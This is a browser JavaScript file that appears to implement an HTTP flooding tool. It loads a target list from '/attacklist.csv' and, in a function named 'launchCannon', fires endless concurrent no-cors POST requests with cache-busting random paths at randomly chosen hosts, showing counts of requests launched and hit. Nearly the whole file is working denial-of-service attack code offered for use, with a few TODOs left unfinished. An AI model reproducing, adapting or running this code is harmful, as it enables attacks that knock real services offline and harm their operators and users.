(function () {
  var elements = {
    btn: document.getElementById("btnAction"),
    counter: document.getElementById("txtCounter"),
  };

  var counter = {
    total: 0,
    hit: 0,
  };

  var stats = {
    // TODO
  }

  function refreshCounter() {
    elements.counter.innerHTML = `Launched: <strong>${counter.total}</strong>, Hit: <strong>${counter.hit}</strong>`;
  }

  window.getTargets = function (cb) {
    fetch("/attacklist.csv").then((res) => {
      res.text().then((list) => {
        const targets = list
          .split("\n")
          .slice(1)
          .filter((i) => !!i)
          .map((i) => {
            const row = i.split(",");
            return {
              host: row[0],
              port: row[1],
              path: row[2],
            };
          });
        cb(targets);
      });
    });
  };

  const getMaxConcurrent = function () {
    return 10;
  }

  window.launchCannon = function (bytes, progressCb, done) {
    const maxConcurrent = getMaxConcurrent();

    getTargets(function (targets) {
      function fireRequests() {
        const target = targets[Math.floor(Math.random() * targets.length)];

        var rand = Math.floor(Math.random() * 1000000) + new Date().getTime();
        refreshCounter();
        
        function fire() {
          counter.total++;
          fetch(`https://${target.host}:${target.port}/${(target.path || '').replace('{rand}', rand)}`, {
            method: "POST",
            mode: "no-cors",
          }).finally(function () {
            counter.hit++;
            refreshCounter();
            // TODO until done
            fire();
          });
        }

        for (let i = 0; i <= maxConcurrent; i++) {
          fire()
        }
      }

      fireRequests();
    });
  };
})();
